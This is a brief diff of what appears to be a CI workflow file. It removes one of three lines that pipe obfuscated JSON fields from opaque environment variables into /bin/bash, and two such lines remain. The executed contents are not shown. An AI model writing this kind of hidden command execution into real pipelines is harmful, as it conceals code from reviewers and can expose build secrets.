@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$xkufb57" | jq -r .vso83703 | /bin/bash
           printf '%s' "$dqtp814" | jq -r .p44341 | /bin/bash
-          printf '%s' "$qqmhi9" | jq -r .yamcr51508 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
